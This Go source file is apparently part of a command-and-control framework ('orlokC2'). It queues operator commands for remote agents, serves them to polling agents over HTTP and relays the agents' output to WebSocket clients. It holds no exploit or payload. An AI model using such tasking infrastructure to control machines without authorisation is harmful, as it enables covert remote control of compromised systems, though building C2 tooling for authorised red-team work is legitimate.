package websocket

import (
	"encoding/json"
	"net/http"
	"orlokC2_final/internal/router"
	"sync"
)

// CommandQueue stores pending commands for agents
type CommandQueue struct {
	// Map of agent UUID to command
	PendingCommands map[string]string
	mu              sync.Mutex
}

// Global command queue
var AgentCommands = CommandQueue{
	PendingCommands: make(map[string]string),
}

// QueueCommand adds a command to the queue for an agent
func (cq *CommandQueue) QueueCommand(agentID, command string) {
	cq.mu.Lock()
	defer cq.mu.Unlock()
	cq.PendingCommands[agentID] = command
}

// GetCommand retrieves and removes a command for an agent
func (cq *CommandQueue) GetCommand(agentID string) (string, bool) {
	cq.mu.Lock()
	defer cq.mu.Unlock()

	cmd, exists := cq.PendingCommands[agentID]
	if exists {
		delete(cq.PendingCommands, agentID)
	}
	return cmd, exists
}

// CommandHandler processes WebSocket commands and queues them for agents
func ProcessWSCommand(msg Message) {
	if msg.Type == CommandMessage && msg.AgentID != "" && msg.Command != "" {
		// Queue the command for the agent
		AgentCommands.QueueCommand(msg.AgentID, msg.Command)
	}
}

// CommandEndpoint handles command requests from agents
func CommandEndpoint(w http.ResponseWriter, r *http.Request) {
	// Get the agent UUID from the request context
	agentUUID, _ := r.Context().Value(router.AgentUUIDKey).(string)

	// Check if we have a command for this agent
	cmd, exists := AgentCommands.GetCommand(agentUUID)

	// Prepare response
	response := struct {
		Command    string `json:"command,omitempty"`
		HasCommand bool   `json:"hasCommand"`
	}{
		HasCommand: exists,
	}

	if exists {
		response.Command = cmd
	}

	// Send JSON response
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
}

// ResultEndpoint receives command results from agents
func ResultEndpoint(w http.ResponseWriter, r *http.Request) {
	// Get the agent UUID from the request context
	agentUUID, _ := r.Context().Value(router.AgentUUIDKey).(string)

	// Parse the incoming result
	var result struct {
		Command string `json:"command"`
		Output  string `json:"output"`
		Status  string `json:"status"`
	}

	if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
		http.Error(w, "Invalid request body", http.StatusBadRequest)
		return
	}

	// Forward the result to the WebSocket clients
	if GlobalWSServer != nil {
		GlobalWSServer.SendCommandResult(agentUUID, result.Command, result.Output)
	}

	// Send acknowledgment
	w.WriteHeader(http.StatusOK)
}
